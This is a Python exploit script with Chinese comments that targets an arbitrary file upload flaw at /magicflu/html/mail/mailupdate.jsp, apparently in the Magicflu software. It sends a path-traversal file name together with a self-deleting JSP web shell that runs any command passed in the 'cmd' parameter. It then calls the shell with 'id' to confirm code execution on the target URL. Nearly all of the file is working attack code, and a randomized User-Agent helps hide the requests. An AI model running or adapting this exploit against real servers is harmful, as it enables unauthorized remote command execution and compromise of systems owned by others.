import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='漏洞存在位置/magicflu/html/mail/mailupdate.jsp可以上传任意文件',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')


args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/magicflu/html/mail/mailupdate.jsp"  # 移除末尾的斜杠
        url1 = args.url[:-1] + "/magicflu/1hcm1x.jsp"
    else:
        url = args.url + "/magicflu/html/mail/mailupdate.jsp"
        url1 = args.url + "/magicflu/1hcm1x.jsp"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': fake.user_agent(),
    "Connection": "close",
    "Content-Type": "multipart/form-data; boundary=00contenteboundary00",  # 注意边界值
    "Accept-Encoding": "gzip"
}

# 构造查询参数（Base64 编码参数）
data = {
    'messageid': '/../../../1hcm1x.jsp',
    'messagecontent': '<% java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b)) != -1) { out.print(new String(b, 0, a)); } out.print("</pre>"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>'
}

data1 ={
    'cmd': 'id'
}

response = requests.get(url=url,
    headers=headers,
    data=data)
response1 = requests.get(url=url1,headers=headers,data=data1)

if "uid" in response1.text:
    print("目标url："+ url + '\n' +"访问存放的恶意成功\n")
    print(response.text)
else:
    print("目标url："+ url + '\n' +"不存在漏洞")
# print(response.text)